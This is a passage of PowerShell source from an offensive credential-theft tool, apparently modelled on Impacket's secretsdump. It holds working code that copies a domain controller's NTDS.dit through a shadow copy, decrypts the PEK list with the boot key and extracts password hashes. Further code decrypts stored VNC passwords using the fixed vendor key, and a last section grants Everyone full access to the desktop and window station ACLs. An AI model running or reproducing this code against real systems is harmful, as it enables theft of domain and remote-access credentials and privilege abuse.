	$CheckSum = [BitConverter]::ToUInt32($MainHeader[0..3], 0)
	$Signature = $MainHeader[4..7]
	If (@(Compare-Object $Signature @([Int]0xEF, [Int]0xCD, [Int]0xAB, [Int]0x89) -SyncWindow 0).Length -ne 0)
	{
		Write-Host "[...] Invalid NTDS.dit signature"
		Return $Null
	}
	$Version = [BitConverter]::ToUInt32($MainHeader[8..11], 0)
	$FileType = [BitConverter]::ToUInt32($MainHeader[12..15], 0)
	$DBTime = [BitConverter]::ToUInt64($MainHeader[16..23], 0)

	# Structure from Impacket "ese.py" : ESENT_JET_SIGNATURE
	$DBSignature_Random = [BitConverter]::ToUInt32($MainHeader[24..27], 0)
	$DBSignature_CreationTime = [BitConverter]::ToUInt64($MainHeader[28..35], 0)
	$DBSignature_NetBiosName = [System.Text.Encoding]::ASCII.GetString($MainHeader[36..51])

	$DBState = [BitConverter]::ToUInt32($MainHeader[52..555], 0)
	$ConsistenPosition = [BitConverter]::ToUInt64($MainHeader[56..63], 0)
	$ConsistentTime = [BitConverter]::ToUInt64($MainHeader[64..71], 0)
	$AttachTime = [BitConverter]::ToUInt64($MainHeader[72..79], 0)
	$AttachPosition = [BitConverter]::ToUInt64($MainHeader[80..87], 0)
	$DetachTime = [BitConverter]::ToUInt64($MainHeader[88..95], 0)
	$DetachPosition = [BitConverter]::ToUInt64($MainHeader[96..103], 0)

	# Structure from Impacket "ese.py" : ESENT_JET_SIGNATURE
	$LogSignature_Random = [BitConverter]::ToUInt32($MainHeader[104..107], 0)
	$LogSignature_CreationTime = [BitConverter]::ToUInt64($MainHeader[108..115], 0)
	$LogSignature_NetBiosName = [System.Text.Encoding]::ASCII.GetString($MainHeader[116..131])

	$Unknown = [BitConverter]::ToUInt32($MainHeader[132..135], 0)
	$PreviousBackup = [System.Text.Encoding]::ASCII.GetString($MainHeader[136..159])
	$PreviousIncBackup = [System.Text.Encoding]::ASCII.GetString($MainHeader[160..183])
	$CurrentFullBackup = [System.Text.Encoding]::ASCII.GetString($MainHeader[184..207])
	$ShadowingDisables = [BitConverter]::ToUInt32($MainHeader[208..211], 0)
	$LastObjectID = [BitConverter]::ToUInt32($MainHeader[212..215], 0)
	$WindowsMajorVersion = [BitConverter]::ToUInt32($MainHeader[216..219], 0)
	$WindowsMinorVersion = [BitConverter]::ToUInt32($MainHeader[220..223], 0)
	$WindowsBuildNumber = [BitConverter]::ToUInt32($MainHeader[224..227], 0)
	$WindowsServicePackNumber = [BitConverter]::ToUInt32($MainHeader[228..231], 0)
	$FileFormatRevision = [BitConverter]::ToUInt32($MainHeader[232..235], 0)
	$PageSize = [BitConverter]::ToUInt32($MainHeader[236..239], 0)
	$RepairCount = [BitConverter]::ToUInt32($MainHeader[240..243], 0)
	$RepairTime = [BitConverter]::ToUInt64($MainHeader[244..251], 0)
	$Unknown2 = [System.Text.Encoding]::ASCII.GetString($MainHeader[252..279])
	$ScrubTime = [BitConverter]::ToUInt64($MainHeader[280..287], 0)
	$RequiredLog = [BitConverter]::ToUInt64($MainHeader[288..295], 0)
	$UpgradeExchangeFormat = [BitConverter]::ToUInt32($MainHeader[296..299], 0)
	$UpgradeFreePages = [BitConverter]::ToUInt32($MainHeader[300..303], 0)
	$UpgradeSpaceMapPages = [BitConverter]::ToUInt32($MainHeader[304..307], 0)
	$CurrentShadowBackup = [System.Text.Encoding]::ASCII.GetString($MainHeader[308..331])
	$CreationFileFormatVersion = [BitConverter]::ToUInt32($MainHeader[332..335], 0)
	$CreationFileFormatRevision = [BitConverter]::ToUInt32($MainHeader[336..339], 0)
	$Unknown3 = [System.Text.Encoding]::ASCII.GetString($MainHeader[340..355])
	$OldRepairCount = [BitConverter]::ToUInt32($MainHeader[356..359], 0)
	$ECCCount = [BitConverter]::ToUInt32($MainHeader[360..363], 0)
	$LastECCTime = [BitConverter]::ToUInt64($MainHeader[364..371], 0)
	$OldECCFixSuccessCount = [BitConverter]::ToUInt32($MainHeader[372..375], 0)
	$ECCFixErrorCount = [BitConverter]::ToUInt32($MainHeader[376..379], 0)
	$LastECCFixErrorTime = [BitConverter]::ToUInt64($MainHeader[380..387], 0)
	$OldECCFixErrorCount = [BitConverter]::ToUInt32($MainHeader[388..391], 0)
	$BadCheckSumErrorCount = [BitConverter]::ToUInt32($MainHeader[392..395], 0)
	$LastBadCheckSumTime = [BitConverter]::ToUInt64($MainHeader[396..403], 0)
	$OldCheckSumErrorCount = [BitConverter]::ToUInt32($MainHeader[404..407], 0)
	$CommittedLog = [BitConverter]::ToUInt32($MainHeader[408..411], 0)
	$PreviousShadowCopy = [System.Text.Encoding]::ASCII.GetString($MainHeader[412..435])
	$PreviousDifferentialBackup = [System.Text.Encoding]::ASCII.GetString($MainHeader[436..459])
	$Unknown4 = [System.Text.Encoding]::ASCII.GetString($MainHeader[460..483])
	$NLSMajorVersion = [BitConverter]::ToUInt32($MainHeader[484..487], 0)
	$NLSMinorVersion = [BitConverter]::ToUInt32($MainHeader[488..491], 0)
	$Unknown5 = [System.Text.Encoding]::ASCII.GetString($MainHeader[492..639])
	$UnknownFlags = [BitConverter]::ToUInt32($MainHeader[640..643], 0)

	$TotalPages = ([Math]::Floor($NTDSContent.Length / $PageSize)) - 2
	Write-Host ("[...] Database version = 0x{0:X4}" -f ($Version))
	Write-Host ("[...] Database revision = 0x{0:X4}" -f ($FileFormatRevision))
	Write-Host ("[...] Database page size = {0}" -f ($PageSize))
	Write-Host ("[...] Database total pages = {0}" -f ($TotalPages))

	# 2- Parse DB starting at page 4
	Write-Host ("[+] Parse NTDS database from page 4")
	$CATALOG_PAGE_NUMBER = 4
	ParseCatalog $NTDSContent $CATALOG_PAGE_NUMBER $Version $FileFormatRevision $PageSize

	# 3- Open page table "datatable" and position a cursor at the leaf levels for fast reading
	If ($Global:PageTables["datatable"])
	{
		$Entry = $Global:PageTables["datatable"]["TableEntry"]

		# Structure from Impacket "ese.py" : ESENT_DATA_DEFINITION_HEADER
		$DataDefinitionHeader = @{}
		$DataDefinitionHeader["LastFixedSize"] = [UInt32]($Entry["EntryData"][0])
		$DataDefinitionHeader["LastVariableDataType"] = [UInt32]($Entry["EntryData"][1])
		$DataDefinitionHeader["VariableSizeOffset"] = [BitConverter]::ToUInt16($Entry["EntryData"][2..3], 0)

		# Structure from Impacket "ese.py" : ESENT_CATALOG_DATA_DEFINITION_ENTRY
		$CatalogEntry = @{}
		$CatalogEntry["FatherPageID"] = [BitConverter]::ToUInt32($Entry["EntryData"][4..7], 0)
		$CatalogEntry["Type"] = [BitConverter]::ToUInt16($Entry["EntryData"][8..9], 0)
		$CatalogEntry["Identifier"] = [BitConverter]::ToUInt32($Entry["EntryData"][10..13], 0)

		$CATALOG_TYPE_TABLE = 1
		$CATALOG_TYPE_COLUMN = 2
		$CATALOG_TYPE_INDEX = 3
		$CATALOG_TYPE_LONG_VALUE = 4
		$CATALOG_TYPE_CALLBACK = 5
		If ($CatalogEntry["Type"] -eq $CATALOG_TYPE_TABLE)
		{
			$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
		}
		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_COLUMN)
		{
			$CatalogEntry["ColumnType"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
			$CatalogEntry["ColumnFlags"] = [BitConverter]::ToUInt32($Entry["EntryData"][22..25], 0)
			$CatalogEntry["CodePage"] = [BitConverter]::ToUInt32($Entry["EntryData"][26..29], 0)
			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
		}
		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_INDEX)
		{
			$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
			$CatalogEntry["IndexFlags"] = [BitConverter]::ToUInt32($Entry["EntryData"][22..25], 0)
			$CatalogEntry["Locale"] = [BitConverter]::ToUInt32($Entry["EntryData"][26..29], 0)
			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
		}
		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_LONG_VALUE)
		{
			$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
		}
		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "[...] Callback type not supported"; Return $Null }
		Else { Write-Host ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }

		# Position a cursor at the leaf levels for fast reading
		$PageNum = $CatalogEntry["FatherDataPageNumber"]
		$Done = $False
		While ($Done -eq $False)
		{
			$PageData, $PageRecord, $PageRecordLength = GetPageRecord $NTDSContent $PageNum $Version $FileFormatRevision $PageSize
			If ($PageRecord["FirstAvailablePageTag"] -le 1)
			{
				# There are no records
				$Done = $True
			}

			For ($i = 1; $i -lt $PageRecord["FirstAvailablePageTag"]; $i += 1)
			{
				$PageFlags, $TagData = GetTag $PageData $PageRecord $i $PageRecordLength $Version $FileFormatRevision $PageSize
				$FLAGS_LEAF = 2
				If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -eq 0)
				{
					# Branch page, move on to the next page

					# Structure from Impacket "ese.py" : ESENT_BRANCH_ENTRY
					$TAG_COMMON = 4
					$Start = 0
					If (($PageFlags -band $TAG_COMMON) -gt 0)
					{
						# Include the common header
						$CommonPageKeySize = [BitConverter]::ToUInt16($TagData[0..1], 0)
						$Start = 2
					}

					$LocalPageKeySize = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
					$X = $Start + 2
					$Y = $X + $LocalPageKeySize
					$LocalPageKey = $TagData[$X..($Y-1)]
					$X = $Y
					$Y = $X + 4
					$ChildPageNumber = [BitConverter]::ToUInt32($TagData[$X..($Y-1)], 0)

					$PageNum = $ChildPageNumber
					Break
				}
				Else { $Done = $True; Break }
			}
		}

		$Cursor = @{}
		$Cursor["TableData"] = $Global:PageTables["datatable"]
		$Cursor["FatherDataPageNumber"] = $CatalogEntry["FatherDataPageNumber"]
		$Cursor["CurrentPageRecord"] = $PageRecord
		$Cursor["CurrentPageData"] = $PageData
		$Cursor["CurrentTag"] = 0

		# 4- Search PEKList (we may found user account record while searching, store them for later processing)

		$TMPUsers = @()

		# Structure from Impacket "secretsdump.py" : NAME_TO_INTERNAL
		$NameToInternal = @{}
		$NameToInternal["uSNCreated"] = "ATTq131091"
		$NameToInternal["uSNChanged"] = "ATTq131192"
		$NameToInternal["name"] = "ATTm3"
		$NameToInternal["objectGUID"] = "ATTk589826"
		$NameToInternal["objectSid"] = "ATTr589970"
		$NameToInternal["userAccountControl"] = "ATTj589832"
		$NameToInternal["primaryGroupID"] = "ATTj589922"
		$NameToInternal["accountExpires"] = "ATTq589983"
		$NameToInternal["logonCount"] = "ATTj589993"
		$NameToInternal["sAMAccountName"] = "ATTm590045"
		$NameToInternal["sAMAccountType"] = "ATTj590126"
		$NameToInternal["lastLogonTimestamp"] = "ATTq589876"
		$NameToInternal["userPrincipalName"] = "ATTm590480"
		$NameToInternal["unicodePwd"] = "ATTk589914"
		$NameToInternal["dBCSPwd"] = "ATTk589879"
		$NameToInternal["ntPwdHistory"] = "ATTk589918"
		$NameToInternal["lmPwdHistory"] = "ATTk589984"
		$NameToInternal["pekList"] = "ATTk590689"
		$NameToInternal["supplementalCredentials"] = "ATTk589949"
		$NameToInternal["pwdLastSet"] = "ATTq589920"

		# Structure from Impacket "secretsdump.py" : ACCOUNT_TYPES
		# SAM_NORMAL_USER_ACCOUNT = 0x30000000
		# SAM_MACHINE_ACCOUNT     = 0x30000001
		# SAM_TRUST_ACCOUNT       = 0x30000002
		$AccountTypes = @([UInt32]0x30000000, [UInt32]0x30000001, [UInt32]0x30000002)

		$EncPEKListData = $Null
		Write-Host ("[+] Searching PEKList into database and decrypt It with BootKey")
		While ($True)
		{

			# Structure from Impacket "secretsdump.py" : __filter_tables_usersecret
			$FilterTables = @{}
			$FilterTables[$NameToInternal["objectSid"]] = 1
			$FilterTables[$NameToInternal["dBCSPwd"]] = 1
			$FilterTables[$NameToInternal["name"]] = 1
			$FilterTables[$NameToInternal["sAMAccountType"]] = 1
			$FilterTables[$NameToInternal["unicodePwd"]] = 1
			$FilterTables[$NameToInternal["sAMAccountName"]] = 1
			$FilterTables[$NameToInternal["userPrincipalName"]] = 1
			$FilterTables[$NameToInternal["ntPwdHistory"]] = 1
			$FilterTables[$NameToInternal["lmPwdHistory"]] = 1
			$FilterTables[$NameToInternal["pwdLastSet"]] = 1
			$FilterTables[$NameToInternal["userAccountControl"]] = 1
			$FilterTables[$NameToInternal["supplementalCredentials"]] = 1
			$FilterTables[$NameToInternal["pekList"]] = 1

			$Record = GetNextRow $NTDSContent $Cursor $FilterTables $PageRecordLength $Version $FileFormatRevision $PageSize

			If ($Record)
			{
				If ($Record[$NameToInternal["pekList"]])
				{
					$EncPEKListData = $Record[$NameToInternal["pekList"]]
					Break
				}

				If ($Record[$NameToInternal["sAMAccountType"]])
				{
					$sAMAccountType = [BitConverter]::ToUInt32($Record[$NameToInternal["sAMAccountType"]], 0)
					If ($AccountTypes -Contains $sAMAccountType)
					{
						# Found some users, but not ready to process them. Store them
						$TMPUsers += ,($Record)
					}
				}
			}
			Else { Break }
		}

		# 5- Decrypt the PEKList if founded and store PEK Keys
		$PEKs = @()
		If ($EncPEKListData)
		{
			Write-Host ("[...] Found Encrypted PEKList = {0}" -f ([System.BitConverter]::ToString($EncPEKListData).Replace("-", "")))

			# Structure from Impacket "secretsdump.py" : PEKLIST_ENC
			$Header = $EncPEKListData[0..7]
			$KeyMaterial = $EncPEKListData[8..23]
			$EncPEKList = $EncPEKListData[24..($EncPEKListData.Length-1)]

			If (@(Compare-Object $Header[0..3] @(0x02, 0x00, 0x00, 0x00) -SyncWindow 0).Length -eq 0)
			{
				# Up to Windows 2012 R2 looks like header starts this way
				$MD5 = [System.Security.Cryptography.MD5]::Create()
				$Update = $BootKey
				For ($i = 0; $i -lt 1000; $i += 1)
				{
					$Update += $KeyMaterial
				}
				$Key = $MD5.ComputeHash($Update)
				$Plaintext = (NewRC4 $Key).Transform($EncPEKList)

				# Structure from Impacket "secretsdump.py" : PEKLIST_PLAIN
				$Header = $Plaintext[0..31]
				$DecPEKList = $Plaintext[32..($Plaintext.Length-1)]

				$PEKLen = 20
				For ($i = 0; $i -lt ([Math]::Floor($DecPEKList.Length / $PEKLen)); $i += 1)
				{
					$Index = $i * $PEKLen
					$PEKData = $DecPEKList[$Index..($Index + $PEKLen - 1)]

					# Structure from Impacket "secretsdump.py" : PEK_KEY
					$Header = $PEKData[0]
					$Padding = $PEKData[1..3]
					$PEK = $PEKData[4..19]

					Write-Host ("[...] Decrypted PEK #{0} = {1}" -f ($i, [System.BitConverter]::ToString($PEK).Replace("-", "")))
					$PEKs += ,($PEK)
				}
			}
			ElseIf (@(Compare-Object $Header[0..3] @(0x03, 0x00, 0x00, 0x00) -SyncWindow 0).Length -eq 0)
			{
				# Windows 2016 TP4 header starts this way
                # Encrypted PEK Key seems to be different, but actually similar to decrypting LSA Secrets
                # Using AES: Key = BootKey, CipherText = EncPEKList, IV = KeyMaterial
				$Plaintext = AESTransform $BootKey $EncPEKList $KeyMaterial ([Security.Cryptography.CipherMode]::CBC) $False

				# Structure from Impacket "secretsdump.py" : PEKLIST_PLAIN
				$Header = $Plaintext[0..31]
				$DecPEKList = $Plaintext[32..($Plaintext.Length-1)]

				# PEK list entries take the form: index (4 byte LE int), PEK (16 byte key)
                # The entries are in ascending order, and the list is terminated
                # by an entry with a non-sequential index (08080808 observed)
				$Pos = 0; $CurIndex = 0
				While ($True)
				{
					$PEKEntry = $DecPEKList[$Pos..($Pos+20-1)]
					If ($PEKEntry.Length -lt 20)
					{
						# If list truncated (should not happen)
						Break
					}
					$Index = [BitConverter]::ToUInt32($PEKEntry[0..3], 0)
					$PEK = $PEKEntry[4..19]
					If ($Index -ne $CurIndex)
					{
						# Break on non-sequential index
						Break
					}

					Write-Host ("[...] Decrypted PEK #{0} = {1}" -f ($Index, [System.BitConverter]::ToString($PEK).Replace("-", "")))
					$PEKs += ,($PEK)

					$CurIndex += 1
					$Pos += 20
				}
			}
			Else
			{
				Write-Host ("[...] Unknown Encrypted PEKList Header format")
				Return $Null
			}

			# 6- Now we have PEK Keys, Let decrypt each user record
			Write-Host ("[+] Searching user records into database and decrypt them with PEK keys")
			$Users = @()

			# Starting from users already cached when searching Encrypted PEKList
			ForEach ($UserRecord in $TMPUsers)
			{
				# Let decrypt user record
				$Users += ,(DecryptUserRecord $UserRecord $PEKs)
			}

			# Then search other users into NTDS after Encrypted PEKList and decrypt LM/NT hashes
			While ($True)
			{
				$Record = GetNextRow $NTDSContent $Cursor $FilterTables $PageRecordLength $Version $FileFormatRevision $PageSize
				If ($Record)
				{
					If ($Record[$NameToInternal["sAMAccountType"]])
					{
						$sAMAccountType = [BitConverter]::ToUInt32($Record[$NameToInternal["sAMAccountType"]], 0)
						If ($AccountTypes -Contains $sAMAccountType)
						{
							# Found a user record, Let decrypt user record
							$Users += ,(DecryptUserRecord $Record $PEKs)
						}
					}
				}
				Else { Break }
			}

			# Return user infos gathered
			Return $Users
		}
		Else
		{
			Write-Host ("[...] No PEKList found into NTDS")
			Return $Null
		}
	}
	Else
	{
		Write-Host ("[...] No page table 'datatable' into NTDS")
		Return $Null
	}
}

function Get-NTDS($Method, $BootKey)
{
	<#
		Get-NTDS:
			- Method 1: Get C:\Windows\NTDS\ntds.dit via Shadow Copy and Parse It as Microsoft Extensive Storage Engine (ESE) format
			- Method 2: Get NTDS.dit via IDL_DRSGetNCChanges()
	#>
	Write-Host ("`n[===] Searching NTDS.dit and try to parse It [===]")

	If (Test-Path "HKLM:SYSTEM\CurrentControlSet\Services\NTDS\Parameters")
	{
		If ($Method -eq "Shadow Copy")
		{
			$NTDSLocationWithDrive = (Get-Item "HKLM:SYSTEM\CurrentControlSet\Services\NTDS\Parameters").GetValue("DSA Database file")
			$NTDSLocation = $NTDSLocationWithDrive.Substring(3, $NTDSLocationWithDrive.Length-3)
			$NTDSDrive = $NTDSLocationWithDrive.Substring(0, 2)
			$NTDSSavePath = "C:\Windows\Temp\NTDS.dit"

			# List existing Shadow Copies and try to find NTDS.dit, If not found: Create one
			$ShadowCopies = Get-WMIObject -Class Win32_ShadowCopy -Computer "localhost"
			$FoundNTDS = $False
			If ($ShadowCopies)
			{
				ForEach ($ShadowCopy in $ShadowCopies)
				{
					$ShadowCopyPath = $ShadowCopy.GetPropertyValue("DeviceObject")
					Try
					{
						If (Test-Path $NTDSSavePath) { Remove-Item $NTDSSavePath -Force }
						[System.IO.File]::Copy("$ShadowCopyPath\$NTDSLocation", $NTDSSavePath)
						$FoundNTDS = $True
						Break
					}
					Catch {}
				}
			}

			If (-not $FoundNTDS)
			{
				$NewShadowCopy = (Get-WMIObject -List Win32_ShadowCopy -ComputerName "localhost").Create("$NTDSDrive\", "ClientAccessible")
				$NewShadowCopyID = $NewShadowCopy.GetPropertyValue("ShadowID")
				$ShadowCopies = Get-WMIObject -Class Win32_ShadowCopy -Computer "localhost"
				ForEach ($ShadowCopy in $ShadowCopies)
				{
					If ($ShadowCopy.GetPropertyValue("ID") -eq $NewShadowCopyID)
					{
						$ShadowCopyPath = $ShadowCopy.GetPropertyValue("DeviceObject")
						If (Test-Path $NTDSSavePath) { Remove-Item $NTDSSavePath -Force }
						[System.IO.File]::Copy("$ShadowCopyPath\$NTDSLocation", $NTDSSavePath)
						$ShadowCopy.Delete()
						Break
					}
				}
			}

			Write-Host ("[+] Saved NTDS.dit via Shadow Copy at $NTDSSavePath")

			# Now we have NTDS.dit at C:\Windows\Temp\NTDS.dit, Let parse It using Microsoft Extensive Storage Engine (ESE) format
			$Users = ParseNTDS $NTDSSavePath $BootKey
			Remove-Item $NTDSSavePath -Force
			Return $Users
		}
		Else # Use Method = IDL_DRSGetNCChanges()
		{
			# Not implemented
			Return $Null
		}
	}
	Else
	{
		Write-Host ("[-] Computer is not a DC")
		Return $Null
	}
}

<#################>
<# VNC Passwords #>
<#################>

function DecryptVNCPwd($Key, $PwdBytes)
{
	<#
		DecryptVNCPwd:
			- Get blocks of 64 bits from password bytes
				- If password bytes < 8: Pad to 8 bytes with null bytes
				- If password bytes > 8 and not divisble by 8: Truncate to 8 bytes
			- Apply DES Encryption on each block :  Block = 64 bits, Key = 64 bits, IV = \x00 * 8, Mode = "CBC"
			- Remove bytes after first null byte
	#>

	$ClearTextBytes = @()

	If ($PwdBytes.Length -lt 8)
	{
		$PwdBytes += (,[byte]0) * (8 - $PwdBytes.Length)
	}
	ElseIf ($PwdBytes.Length -gt 8)
	{
		If (($PwdBytes.Length % 8) -ne 0)
		{
			Write-Host ("[WARNING] Decrypted pwd will be truncated to 8 bytes (Encrypted pwd length > 8 and not divisible by 8)")
			$PwdBytes = $PwdBytes[0..7]
		}
	}

	For ($i = 0; $i -lt $PwdBytes.Length; $i += 8)
	{
		$Block = $PwdBytes[$i..($i+8-1)]
		If ($Block.Length -lt 8) { $Block += (,[byte]0) * (8 - $Block.Length) }

		$ClearTextBytes += DESTransform $Key $Block ((,[byte]0) * 8) $False
	}

	$FirstNullByteIndex = $ClearTextBytes.IndexOf([byte]0)
	If ($FirstNullByteIndex -gt 0)
	{
		$ClearTextBytes = $ClearTextBytes[0..($FirstNullByteIndex)]
	}

	return $ClearTextBytes
}

function Get-VNCPwds()
{
	<#
		Get-VNCPwds: Get Hex Encoded VNC passwords from registries or files (depending on VNC server), and decrypt them with same VNC Secret Key
	#>

	Write-Host ("`n[===] Searching VNC pwds and decrypt them with same VNC Secret Key [===]")

	$RegPaths = @("HKLM:SOFTWARE\RealVNC\vncserver", "HKLM:SOFTWARE\TightVNC\Server", "HKLM:SOFTWARE\Wow6432Node\TightVNC\Server", "HKLU:SOFTWARE\TigerVNC\WinVNC4")
	$FilePaths = @("$Env:Programfiles\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\UltraVNC\ultravnc.ini", "$Env:Programfiles\Uvnc Bvba\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\Uvnc Bvba\UltraVNC\ultravnc.ini")
	$Pwds = @()
	$FindOne = $False

	# Same VNC Secret Key used for different VNC Server
	$VNCKey = @(0xe8, 0x4a, 0xd6, 0x60, 0xc4, 0x72, 0x1a, 0xe0)

	ForEach ($RegPath in $RegPaths)
	{
		If (Test-Path $RegPath)
		{
			$Reg = Get-Item "$RegPath"
			ForEach ($Key in ("Password", "ControlPassword", "PasswordViewOnly"))
			{
				$PwdEncryptedBytes = $Reg.GetValue($Key)
				If ($PwdEncryptedBytes)
				{
					$FindOne = $True
					$ClearTextBytes = DecryptVNCPwd $VNCKey $PwdEncryptedBytes
					$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)

					Write-Host ("[+] Decrypted {0} = {1}" -f ("$RegPath\$Key", $ClearText))
				}
			}
		}
	}
	ForEach ($FilePath in $FilePaths)
	{
		If (Test-Path $FilePath)
		{
			ForEach ($Line in (Get-Content $FilePath))
			{
				ForEach ($Key in ("passwd", "passwd2"))
				{
					If ($Line -match $Key)
					{
						$HexStringPwd = ($Line.Split("="))[1]
						If ($HexStringPwd)
						{
							$FindOne = $True
							$PwdEncryptedBytes = HexStringToBytes $HexStringPwd
							$ClearTextBytes = DecryptVNCPwd $VNCKey $PwdEncryptedBytes
							$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)

							Write-Host ("[+] Decrypted {0} = {1}" -f ($FilePath, $ClearText))
						}
					}
				}
			}
		}
	}

	If (-not ($FindOne)) { Write-Host "[-] No VNC pwds found" }
}

<##################>
<# Session Tokens #>
<##################>

# Change the ACL of the WindowStation and Desktop
function Set-DesktopACLs
{
	# Enable SeSecurityPrivilege
	If (-not (EnablePrivilege "SeSecurityPrivilege"))
	{
		Write-Host ("[-] Failed to enable SeSecurityPrivilege`n")
		return $False
	}

	# Change the privilege for the current window station to allow full privilege for all users
	$WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
	$hWinsta = [TokensAPI]::OpenWindowStationW($WindowStationStr, $False, [TokensAPI]::ACCESS_SYSTEM_SECURITY -bor [TokensAPI]::READ_CONTROL -bor [TokensAPI]::WRITE_DAC)

	if ($hWinsta -eq [IntPtr]::Zero)
	{
		Write-Host ("[-] OpenWindowStationW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
		return $False
	}

	If (-not $(Set-DesktopACLToAllowEveryone $hWinsta)) { return $False }
	$Discard = [TokensAPI]::CloseHandle($hWinsta)

	# Change the privilege for the current desktop to allow full privilege for all users
	$hDesktop = [TokensAPI]::OpenDesktopA("default", 0, $False, [TokensAPI]::DESKTOP_GENERIC_ALL -bor [TokensAPI]::WRITE_DAC)
	if ($hDesktop -eq [IntPtr]::Zero)
	{
		Write-Host ("[-] OpenDesktopA() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
		return $False
	}

	If (-not $(Set-DesktopACLToAllowEveryone $hDesktop)) { return $False }
	$Discard = [TokensAPI]::CloseHandle($hDesktop)
	return $True
}

function Set-DesktopACLToAllowEveryone($hObject)
{
	[IntPtr]$ppSidOwner = [IntPtr]::Zero
	[IntPtr]$ppsidGroup = [IntPtr]::Zero
	[IntPtr]$ppDacl = [IntPtr]::Zero
	[IntPtr]$ppSacl = [IntPtr]::Zero
	[IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
	# 0x7 is window station, change for other types
	$retVal = [TokensAPI]::GetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
	if ($retVal -ne 0)
	{
		Write-Host ("[-] GetSecurityInfo() failed with error {0}`n" -f ($retVal));
		return $False
	}

	if ($ppDacl -ne [IntPtr]::Zero)
	{
		$AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type](New-Object TokensAPI+ACL).GetType())

		# Add all users to ACL
		[UInt32]$RealSize = 2000
		$pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
		$Success = [TokensAPI]::CreateWellKnownSid(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
		if (-not $Success)
		{
			Write-Host ("[-] CreateWellKnownSid() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
			return $False
		}

		# For user "Everyone"
		$TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+TRUSTEE).GetType())
		$TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
		$TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type](New-Object TokensAPI+TRUSTEE).GetType())
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
		$TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
		$TrusteeObj.MultipleTrusteeOperation = 0
		$TrusteeObj.TrusteeForm = [TokensAPI]::TRUSTEE_IS_SID
		$TrusteeObj.TrusteeType = [TokensAPI]::TRUSTEE_IS_WELL_KNOWN_GROUP
		$TrusteeObj.ptstrName = $pAllUsersSid

		# Give full permission
		$ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+EXPLICIT_ACCESS).GetType())
		$ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
		$ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type](New-Object TokensAPI+EXPLICIT_ACCESS).GetType())
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
		$ExplicitAccess.grfAccessPermissions = 0xf03ff
		$ExplicitAccess.grfAccessMode = [TokensAPI]::GRANT_ACCESS
		$ExplicitAccess.grfInheritance = [TokensAPI]::OBJECT_INHERIT_ACE
		$ExplicitAccess.Trustee = $TrusteeObj

		[IntPtr]$NewDacl = [IntPtr]::Zero

		$RetVal = [TokensAPI]::SetEntriesInAclW(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
		if ($RetVal -ne 0)
		{
			Write-Host ("[-] SetEntriesInAclW() failed with error {0}`n" -f ($retVal));
			return $False
		}

		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)

		if ($NewDacl -eq [IntPtr]::Zero)
		{
			Write-Host ("[-] New DACL is null`n");
			return $False
		}

		# 0x7 is window station, change for other types
		$RetVal = [TokensAPI]::SetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
		if ($RetVal -ne 0)
		{
			Write-Host ("[-] SetSecurityInfo() failed with error {0}`n" -f ($retVal));
			return $False
		}

		$Discard = [TokensAPI]::LocalFree($ppSecurityDescriptor)
		return $True
